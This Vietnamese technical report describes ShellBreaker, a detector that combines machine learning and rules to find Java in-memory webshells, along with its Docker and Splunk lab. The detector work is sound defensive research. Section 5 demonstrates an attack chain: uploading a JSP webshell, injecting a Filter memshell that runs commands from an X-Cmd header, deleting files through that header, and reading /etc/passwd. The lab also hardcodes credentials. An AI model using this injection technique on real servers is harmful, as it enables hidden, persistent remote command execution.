# Báo Cáo Kỹ Thuật: ShellBreaker + memshell-lab

> Phiên bản: 2.1 | Ngày: 2026-05-25 | Tác giả: LNQuynh1009

---

## Mục lục

1. [Tổng quan](#1-tổng-quan)
2. [Kiến trúc hệ thống](#2-kiến-trúc-hệ-thống)
3. [Giải thích từng file](#3-giải-thích-từng-file)
4. [Tích hợp memshell-lab](#4-tích-hợp-memshell-lab)
5. [Attack chain demo](#5-attack-chain-demo)
6. [Kết quả thực nghiệm](#6-kết-quả-thực-nghiệm)
7. [Rule-based: so sánh với c0ny1](#7-rule-based-so-sánh-với-c0ny1)
8. [Hạn chế và hướng phát triển](#8-hạn-chế-và-hướng-phát-triển)

---

## 1. Tổng quan

ShellBreaker là công cụ phát hiện **Java memory webshell (fileless / in-memory webshell)** bằng phân tích tĩnh bytecode. Khác với webshell dạng file (JSP, WAR), memory webshell tồn tại hoàn toàn trong JVM heap — không có file nào trên disk sau khi inject — khiến các scanner truyền thống dựa trên file signature hoàn toàn bỏ qua.

**Nền tảng lý thuyết:** Paper GAShellBreaker (Electronics, MDPI 2025) — phân tích opcode sequence thành bigram adjacency matrix rồi phân loại bằng image classifier. Dự án này mở rộng pipeline bằng XGBoost thay ResNet50 và bổ sung rule-based layer lấy ý tưởng từ c0ny1/java-memshell-scanner.

**Sau khi tích hợp với memshell-lab**, hệ thống hoạt động như một SIEM mini hoàn chỉnh:

```
Tomcat (target với payload thật)
    → ShellBreaker detector theo dõi realtime
    → Splunk (log và dashboard)
    → Email cảnh báo (CONFIRMED/HIGH)
```

---

## 2. Kiến trúc hệ thống

### 2.1 Pipeline phát hiện

```
File .class bytecode (trên disk / Tomcat work dir)
         │
         ▼
  javap -c -p -verbose          ← disassemble JVM bytecode thành text
         │
         ▼
  Opcode sequence extraction    ← regex parse từng dòng "  12: invokevirtual"
  + Normalize short-form opcodes
    (iload_0..3 → iload, iconst_0..5 → iconst, v.v.)
         │
         ├─────────────────────────────────────┐
         ▼                                     ▼
  Feature vector 22,360 dims         Rule-based check (song song)
  [unigram 149 + bigram 22,201        [interface, API nguy hiểm,
   + metadata 10]                      tool fingerprint, scoring]
         │                                     │
         ▼                                     │
  XGBoost → ml_score [0..1]                   │
         │                                     │
         └──────────────┬──────────────────────┘
                        ▼
             Combined verdict logic
                        │
         ┌──────────────┼──────────────┬──────────────┐
         ▼              ▼              ▼              ▼
     CONFIRMED        HIGH           MEDIUM         BENIGN
  (rule HIGH +      (ML ≥ 0.85)   (ML ≥ thr OR    (không có gì)
   ML ≥ thr)                       rule MEDIUM+)
```

### 2.2 Feature vector chi tiết

| Phần | Số chiều | Mô tả |
|------|---------|-------|
| Unigram | 149 | Tần suất chuẩn hóa của mỗi opcode trong 149 opcodes JVM |
| Bigram | 22,201 (149²) | Tần suất chuẩn hóa của mỗi cặp opcode liên tiếp |
| Metadata | 10 | Đặc trưng cấu trúc (xem bên dưới) |
| **Tổng** | **22,360** | |

**10 Metadata features:**

| Index | Giá trị | Ý nghĩa | Tại sao quan trọng |
|-------|---------|---------|-------------------|
| 0 | `min(total_ops/1000, 1.0)` | Kích thước class | Webshell thường nhỏ và compact |
| 1 | `"SourceFile:" in javap` | Có debug attribute không | Class inject tay thường không có |
| 2 | `"$" in classname` | Inner/anonymous class | Anonymous class là dấu hiệu inject |
| 3 | Implements servlet interface | Implements Filter/Servlet | Core indicator của Filter memshell |
| 4 | `"java/lang/Runtime"` | Gọi Runtime.exec | Command execution |
| 5 | `"defineClass"` | Load class động | Dynamic class injection |
| 6 | `"java/net/URLClassLoader"` | Load class từ URL | Remote class loading |
| 7 | `invoke_count / total` | Tỉ lệ method invocation | Webshell gọi method nhiều hơn |
| 8 | `reflect_count / total` | Tỉ lệ reflection proxy | Dấu hiệu truy cập qua reflection |
| 9 | `athrow_count / total` | Tỉ lệ throw exception | Pattern xử lý lỗi đặc trưng |

---

## 3. Giải thích từng file

### 3.1 `scripts/01_collect_dataset.sh` — Thu thập dữ liệu thô

Clone các repo GitHub vào `dataset/webshell_src/` (các tool webshell Java như java-memshell-generator, ysoserial, Godzilla) và `dataset/benign_src/` (18 repo: Tomcat, Spring, Netty, Shiro, Struts, Hibernate…).

Không có logic phức tạp — chỉ là danh sách `git clone`. Chạy một lần, không chạy lại trừ khi cần thêm nguồn mới.

### 3.2 `scripts/02_compile_and_filter.py` — Compile và dedup benign

Biên dịch các file `.java` trong repo benign bằng `javac` (với classpath servlet-api JAR), rồi:
- **MD5 dedup**: Loại bỏ file trùng lặp — nhiều repo dùng chung class
- **Skip dirs**: Bỏ qua `test/`, `generated/`, `build/` để giảm noise
- **Download benign JARs**: Lấy thêm từ Maven Central (commons-lang3, guava, gson, jackson) để tăng diversity

Output: `dataset/compiled/benign/*.class` — chỉ file unique.

### 3.3 `scripts/02b_categorize.py` — Phân loại webshell

Phân chia compiled webshell thành 2 nhóm dựa trên repo nguồn:

- **`webshell_file/`**: file-based webshell (ysoserial, marshalsec, JavaLearnVulnerability…) → dùng để train/val
- **`webshell_fileless/`**: memory/fileless webshell (java-memshell-generator, MemoryShell, wsMemShell…) → **chỉ dùng để test**

Đây là quyết định thiết kế quan trọng nhất: fileless webshell **không bao giờ được dùng trong training**. Kết quả recall=0.952 trên fileless chứng minh model tổng quát hóa thật sự, không phải overfitting.

### 3.4 `scripts/03_build_grayscale.py` — Xây dựng bigram matrix

File xử lý dữ liệu phức tạp nhất. Quy trình cho mỗi `.class`:

**Bước 1 — Disassemble:**
```bash
javap -c -p <file.class>
```
Parse output bằng regex `r"^\s+\d+:\s+([a-z][a-z0-9_]+)"` để lấy danh sách opcode.

**Bước 2 — Normalize opcodes:**
JVM có nhiều "short-form" opcode là alias của opcode gốc:
```
iload_0, iload_1, iload_2, iload_3  →  iload
iconst_0..5, iconst_m1              →  iconst
astore_0..3                         →  astore
... (tương tự cho fload, dload, lload, fstore, dstore, lstore)
```
Sau normalize: đúng 149 opcode canonical theo JVM Specification Chapter 6.

**Bước 3 — Build bigram matrix:**
```python
mat[vocab[ops[i]], vocab[ops[i+1]]] += 1
```
Ma trận 149×149 = 22,201 ô, mỗi ô đếm số lần opcode A đứng trước opcode B.

**Bước 4 — Normalize tuyến tính:**
```python
mat = mat / mat.max() * 255
```
**Tại sao linear, không log?** Log-normalization kéo các giá trị nhỏ lên gần nhau, làm mờ sự khác biệt về tần suất giữa webshell (ít opcode đặc trưng) và benign class (nhiều opcode đa dạng). Linear giữ nguyên độ tương phản.

**Bước 5 — Lưu PNG + dataset.csv:**
- PNG 149×149 grayscale → dùng cho ResNet50 (đã deprecated)
- `dataset.csv`: `path, label, type, class_name`
- `vocab.json`: `{opcode: index}` — 149 entries, cố định cho mọi run

**Size filter** (≥500 byte cho webshell): File `.class` < 500B thường là stub/interface/annotation rỗng từ exploit framework — không phải webshell có chức năng, chỉ làm ô nhiễm training data.

**Parallel processing** bằng `ThreadPoolExecutor` với 8 workers để tăng tốc.

### 3.5 `scripts/04b_train_xgboost.py` — Huấn luyện XGBoost

**Tại sao XGBoost thay ResNet50?**
- Chạy local trong ~2 phút, không cần GPU
- Xử lý trực tiếp feature vector sparse (bigram matrix 99%+ zero) hiệu quả hơn CNN
- Hiệu năng tốt hơn: F1=0.890 vs ResNet50 thấp hơn

**Feature extraction** (giống 03, nhưng trả về numpy vector thay vì PNG):
```python
feature = concat([unigram_149, bigram_22201, metadata_10])  # shape: (22360,)
```

**Training strategy:**

```python
NUM_RUNS = 3   # 3 runs độc lập, trung bình kết quả → đúng methodology paper

# Xử lý class imbalance
scale_pos_weight = n_benign / n_webshell   # ~4.9x (2500 benign / 514 webshell)

# XGBoost params quan trọng
colsample_bytree = 0.4   # Quan trọng vì feature matrix rất sparse
early_stopping_rounds = 40
```

**Threshold optimization:**
Thay vì dùng default 0.50, tìm threshold nhỏ nhất sao cho val precision ≥ 0.50 và maximize recall:
```python
def find_threshold(val_y, val_probs, min_prec=0.50):
    prec, rec, thr = precision_recall_curve(val_y, val_probs)
    mask = prec[:-1] >= min_prec
    return float(thr[mask][argmax(rec[:-1][mask])])
```
Threshold trung bình từ 3 runs được lưu vào `xgb_report.json` → `inference_threshold`.

**Fileless evaluation** (held-out):
```python
# Sau khi train trên file-based, test trên fileless chưa từng thấy
fl_probs = best_model.predict_proba(X_fileless)
# Kết quả: recall=0.952, precision=1.000
```

**Output:** `output/xgb_model.pkl` (model tốt nhất trong 3 runs theo F1), `output/xgb_report.json`.

### 3.6 `scripts/05_inference_api.py` — Inference engine

**Hai chế độ:**

```bash
# CLI — scan một file, in kết quả màu ra terminal
python 05_inference_api.py /path/to/Suspicious.class

# Server — FastAPI, nhận file qua HTTP
python 05_inference_api.py
# → http://localhost:8080/docs
```

**`POST /predict`** — multipart upload `.class` file:
1. Ghi file vào temp dir
2. `extract_features()` → feature vector
3. `model.predict_proba()` → ml_score
4. `rule_check()` → rule verdict
5. `combined_verdict()` → tier
6. Append JSON vào `output/detections.jsonl`

**`GET /threshold`** — xem cấu hình ngưỡng và tier mapping.

**Logic kết hợp:**
```python
if rule_HIGH and ml_score >= threshold:  → CONFIRMED   # Cả ML và rule đồng ý
if ml_score >= 0.85:                     → HIGH         # ML tự tin cao
if ml_score >= threshold OR rule_MEDIUM: → MEDIUM       # Một trong hai cảnh báo
else:                                    → BENIGN
```

### 3.7 `scripts/04_train_resnet50.py` + `notebooks/colab_train.ipynb`

ResNet50 baseline chạy trên Google Colab (GPU). Nhận ảnh PNG 149×149 từ `output/`. **Đã deprecated** — XGBoost hiệu quả hơn và không cần GPU. Giữ lại để so sánh và tham khảo methodology.

### 3.8 `scripts/06_visualize.py`

Tạo 4 biểu đồ trong `output/figures/`:
- Confusion matrix (default và optimized threshold)
- Precision-Recall curve với threshold marker
- Top-20 feature importance từ XGBoost
- So sánh bigram heatmap: webshell vs benign (visual pattern khác biệt rõ)

---

## 4. Tích hợp memshell-lab

### 4.1 Kiến trúc Docker lab

**Location:** `/home/quynh/memshell-lab/`

```
memshell-lab/
├── docker-compose.yml        # Orchestrate 4 containers
├── lab.sh                    # CLI wrapper tiện lợi
├── shellbreaker/
│   └── detector.py           # ShellBreaker detector service
├── app/src/main/java/com/lab/
│   ├── UploadServlet.java    # Endpoint upload file (điểm xâm nhập ban đầu)
│   ├── InjectServlet.java    # Inject Filter memshell qua reflection
│   └── CmdServlet.java       # Command execution
├── splunk/
│   └── init-splunk.sh        # Tạo index shellbreaker + HEC token
└── agent/
    └── shell.jsp             # JSP webshell dùng để khởi động attack chain
```

**4 containers:**

| Container | Image | Port | Vai trò |
|-----------|-------|------|---------|
| `tomcat` | Tomcat 9 + lab app | 8080 | Target bị tấn công |
| `iis` | .NET/IIS | 8090 | Target phụ (.NET demo) |
| `splunk` | Splunk Enterprise 9.2.1 | 8000 | SIEM, log dashboard |
| `shellbreaker` | Python + model | - | Detector service |

**Volume mounts:**
- `xgb_model.pkl` và `vocab.json` từ ShellBreaker → mount read-only vào `/model/` trong container shellbreaker
- Tomcat work dir → mount vào `/watch/work/` trong container shellbreaker
- Log dir → mount shared để đọc từ host

### 4.2 `shellbreaker/detector.py` — Production detector service

Đây là phiên bản production của `05_inference_api.py`, chạy như long-running daemon trong Docker.

**Watchdog filesystem observer:**
```python
# Theo dõi inotify events trên /watch/work và /watch/webapps
observer.schedule(ClassFileHandler, "/watch/work", recursive=True)
observer.schedule(ClassFileHandler, "/watch/webapps", recursive=True)
```

Khi Tomcat compile JSP → tạo `.class` trong work dir → inotify event → `_handle()` được gọi.

**Dedup bằng (path, size, mtime):** Tránh scan cùng file 2 lần khi Tomcat write nhiều chunks:
```python
key = (str(path), st.st_size, round(st.st_mtime, 1))
if key in self._seen: return
```

**0.4s delay:** Chờ Tomcat finish writing file trước khi đọc (tránh đọc file đang ghi dở).

**Alerting pipeline:**
```
Mọi detection → log_to_file() → /logs/shellbreaker/detections.jsonl
              → send_splunk()  → HEC http://splunk:8088 (index=shellbreaker)
CONFIRMED/HIGH → send_email()  → jodielieberher@gmail.com qua Gmail SMTP
```

**Email alert** bao gồm: verdict, filename, ML score, rule hits, SHA-256, timestamp, và link Splunk.

### 4.3 Splunk integration

**HEC Token:** `lab0000-0000-0000-0000-000000000001` (cố định trong docker-compose.yml)

**Event format gửi lên Splunk:**
```json
{
  "time": 1748123456.789,
  "event": {
    "timestamp_iso": "2026-05-25T10:30:56Z",
    "filename": "MemshellFilter$1.class",
    "path": "/watch/work/...",
    "sha256": "abc123...",
    "size_bytes": 2048,
    "verdict": "CONFIRMED",
    "ml_score": 0.9734,
    "rule_level": "HIGH",
    "rule_hits": ["servlet_interface", "runtime_exec", "no_source_attr"]
  },
  "sourcetype": "shellbreaker",
  "index": "shellbreaker"
}
```

**Splunk query để monitor:**
```spl
index=shellbreaker | table _time verdict filename ml_score rule_hits
index=shellbreaker verdict=CONFIRMED OR verdict=HIGH | sort -_time
```

**Lưu ý sau `docker compose down -v`:** Volume Splunk bị wipe → phải re-create index và HEC token thủ công:
```bash
DOCKER_HOST=unix:///var/run/docker.sock docker exec memshell-splunk bash -c "
  /opt/splunk/bin/splunk add index shellbreaker -auth admin:admin123
  # ... (xem memory/project_lab_setup.md để biết full commands)
"
```

---

## 5. Attack chain demo

### 5.1 Tomcat Filter memshell injection

```bash
# Khởi động lab
cd /home/quynh/memshell-lab
./lab.sh up

# Chạy full attack chain
./lab.sh attack
```

**Phase 1 — Upload JSP webshell:**
```bash
curl -F "file=@agent/shell.jsp" http://localhost:8080/app/upload
```
`UploadServlet.java` lưu file vào webroot không kiểm tra extension — đây là lỗ hổng intentional của lab.

**Phase 2 — JSP trigger inject Filter:**
```bash
curl "http://localhost:8080/app/shell.jsp?op=inject"
```
JSP gọi `InjectServlet.java` thực hiện injection qua reflection:

1. Walk reflection chain: `HttpServletRequest → RequestFacade.request → Request.getContext() → StandardContext`
2. Tạo anonymous `Filter` instance inline (tồn tại trong JVM heap, không có file trên disk):
   ```java
   Filter memshell = new Filter() {
       public void doFilter(ServletRequest req, ...) {
           String cmd = ((HttpServletRequest)req).getHeader("X-Cmd");
           if (cmd != null) {
               Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
               // ... return output
           }
       }
   };
   ```
3. Register vào Tomcat qua reflection: `FilterDef → FilterMap → addFilterMapBefore() → rebuild FilterChain cache`

**Phase 3 — Xóa JSP, memshell vẫn còn:**
```bash
curl -H "X-Cmd: rm -f .../shell.jsp" http://localhost:8080/app/index.jsp
```
Từ thời điểm này: không có file nào trên disk, nhưng mọi request có header `X-Cmd: <lệnh>` đều được execute.

```bash
# Interactive shell
./lab.sh shell
tomcat-memshell$ id
uid=0(root) gid=0(root) ...
tomcat-memshell$ cat /etc/passwd
...
```

### 5.2 ShellBreaker phát hiện như thế nào

Khi `shell.jsp` compile lần đầu → Tomcat tạo `shell_jsp.class` trong work dir → detector.py nhận inotify event → scan → MEDIUM/HIGH verdict → gửi Splunk.

Khi `InjectServlet.class` được load (đã compile sẵn trong app) → lúc app deploy, file này được copy vào Tomcat work dir → detector scan → HIGH/CONFIRMED vì:
- Implements `javax/servlet/Servlet`
- Gọi `java/lang/Runtime`
- Dùng reflection (`setAccessible`)
- Không có `SourceFile` attribute (nếu compile không có `-g`)

Tuy nhiên, **anonymous class được inject không bao giờ bị phát hiện** vì nó không tạo file `.class` trên disk — đây chính là giới hạn của static analysis. Phase 3 (Java Agent) sẽ xử lý điểm này bằng cách scan trong memory JVM.

---

## 6. Kết quả thực nghiệm

### 6.1 Dataset

| Category | Số lượng | Dùng cho |
|----------|---------|---------|
| `webshell_file` | 514 | Train + Val (70/15/15 split) |
| `webshell_fileless` | 83 | Test only — **không train** |
| `benign` | 2,500 | Train + Val |
| **Tổng** | **3,097** | |

### 6.2 XGBoost — 3-run average

| Ngưỡng | Precision | Recall | F1 | AUC-ROC |
|--------|-----------|--------|-----|---------|
| Default 0.50 | 0.925 ±0.025 | 0.857 ±0.016 | 0.890 ±0.016 | 0.981 ±0.008 |
| High-recall 0.04 | 0.547 ±0.052 | 0.966 ±0.005 | 0.697 ±0.041 | 0.981 ±0.008 |

**Fileless generalization (chưa từng thấy trong training):**

| Precision | Recall | F1 |
|-----------|--------|-----|
| 1.000 | 0.952 | 0.975 |

Recall=0.952 với Precision=1.000 là kết quả quan trọng nhất: model học từ file-based webshell nhưng detect được memory webshell, chứng minh opcode bigram pattern capture được đặc trưng nguy hiểm xuyên suốt các kỹ thuật injection.

### 6.3 So sánh với baseline

| Tool | Approach | Recall (fileless) | False Positive |
|------|----------|-------------------|---------------|
| copagent | Rule-based (runtime) | ~0.70 | Thấp |
| JShellDetector | Signature-based | ~0.50 | Thấp |
| OpenRASP | RASP hooking | ~0.80 | Trung bình |
| **ShellBreaker** | **ML + Rule (static)** | **0.952** | **Thấp (P=1.0)** |

---

## 7. Rule-based: so sánh với c0ny1

### 7.1 Kiến trúc hoàn toàn khác nhau

| Chiều | ShellBreaker rule layer | c0ny1/java-memshell-scanner |
|-------|------------------------|------------------------------|
| **Môi trường** | Ngoài JVM — phân tích file `.class` | Bên trong JVM — chạy như Java Agent |
| **Input** | Output của `javap` (text) | Class objects đã load trong JVM memory |
| **Thời điểm** | Static (trước khi class load) | Runtime (sau khi inject xảy ra) |
| **API dùng** | Regex trên text | `Instrumentation`, Java Reflection, ClassLoader API |
| **Phát hiện anonymous class** | Không thể (không có file) | Có thể (scan JVM heap) |
| **Evasion resistance** | Thấp hơn | Cao hơn |
| **Vai trò** | Prevention + confidence booster cho ML | Incident response scanner |

### 7.2 c0ny1 kiểm tra sâu hơn nhiều

c0ny1/java-memshell-scanner chạy **bên trong JVM**, scan toàn bộ class đã load:

```java
// c0ny1 walk toàn bộ class hierarchy trong JVM
// Không check text — check Object trực tiếp
for (Class<?> clazz : instrumentation.getAllLoadedClasses()) {
    // 1. Check interface hierarchy (đệ quy)
    if (isImplementing(clazz, "javax.servlet.Filter")) { ... }
    
    // 2. Check ClassLoader provenance — class load từ đâu?
    ClassLoader cl = clazz.getClassLoader();
    if (cl instanceof URLClassLoader || cl.getClass().getName().contains("Anonymous")) {
        // Suspicious — ClassLoader không hợp lệ
    }
    
    // 3. Check CodeSource — có file .class tương ứng trên disk không?
    CodeSource cs = clazz.getProtectionDomain().getCodeSource();
    if (cs == null) { /* anonymous/injected class */ }
    
    // 4. Thread inspection — scan running threads
    // 5. Valve/Interceptor/WebSocket injection patterns
    // 6. Known tool family signatures (Godzilla, Behinder...)
}
```

**c0ny1 phát hiện được nhiều loại hơn:**
- Tomcat Valve injection (pipeline injection)
- Spring HandlerInterceptor injection
- Shiro Filter injection  
- WebSocket endpoint injection
- Thread-based shells (class được inject qua thread context)
- Agent-based shells (dùng `java.lang.instrument`)
- ClassLoader chain anomalies

### 7.3 Rule-based của ShellBreaker (sau khi cải tiến)

Phiên bản cải tiến dùng **hệ thống scoring** thay vì binary check:

```
Interface inject (Filter/Valve/Interceptor/Agent): +3 điểm
API nguy hiểm (Runtime.exec, defineClass, Unsafe...): +2~3 điểm
Known tool fingerprint (Godzilla/Behinder strings): +4 điểm
Tên class đáng ngờ: +2 điểm
Thiếu SourceFile: +1 điểm
Tên class obfuscate (≤3 ký tự): +1 điểm

score ≥ 6 → HIGH
score ≥ 2 → MEDIUM
```

**Các cải tiến so với version cũ:**

| Cải tiến | Version cũ | Version mới |
|---------|-----------|-------------|
| Interface coverage | 8 interfaces (chỉ servlet) | 20+ interfaces (Valve, Spring, WebSocket, Agent...) |
| Dangerous APIs | 3 patterns | 10 patterns (thêm ProcessBuilder, Unsafe, ScriptEngine, Groovy...) |
| Tool fingerprints | Không có | Scan constant pool cho Godzilla/Behinder/IceSorpion strings |
| Scoring | Binary (triggered/not) | Weighted scoring system |
| Obfuscation detection | Không có | Short classname (≤3 chars) |
| Reflection detection | Không | `setAccessible` pattern |

**Giới hạn vẫn còn:** ShellBreaker không thể detect anonymous class inject (không có file trên disk), không check ClassLoader provenance, không scan JVM heap. Đây là lý do cần Phase 3 (Java Agent) — kết hợp static analysis của ShellBreaker với runtime scanning như c0ny1.

---

## 8. Hạn chế và hướng phát triển

### 8.1 Hạn chế hiện tại

| Hạn chế | Nguyên nhân | Impact |
|---------|-------------|--------|
| Không detect anonymous class | Không có file trên disk | Bỏ qua filter inject sau Phase 2 |
| False positive với framework code | Framework class cũng implement servlet interface | Rule layer cần context |
| Phụ thuộc javap | Cần JDK 21 cài trên host/container | Dependency không nhỏ |
| Model stale | Training data từ 2025 | Webshell mới có thể bypass |
| No obfuscation resistance | Attacker đổi tên class/opcode | Giảm recall |

### 8.2 Phase 3 — Java Agent (chưa triển khai)

`agent/` directory hiện trống. Kế hoạch:
- **premain mode**: Attach trước khi JVM start, hook `ClassFileTransformer`
- **agentmain mode**: Attach động vào JVM đang chạy (via Attach API)
- Dùng Javassist để analyze bytecode từ memory
- Kết hợp với ShellBreaker model để score class mới load
- Phát hiện anonymous class inject (điểm blind spot hiện tại)

### 8.3 Hướng cải thiện ngắn hạn

1. **Thêm benign training data** từ Spring Boot applications (hiện chưa đủ diversity)
2. **Cải thiện rule layer** (đã làm trong phiên bản này): scoring, Valve/Interceptor/WebSocket
3. **Retrain model** định kỳ khi có webshell mẫu mới
4. **Splunk dashboard** với biểu đồ timeline và alert correlation
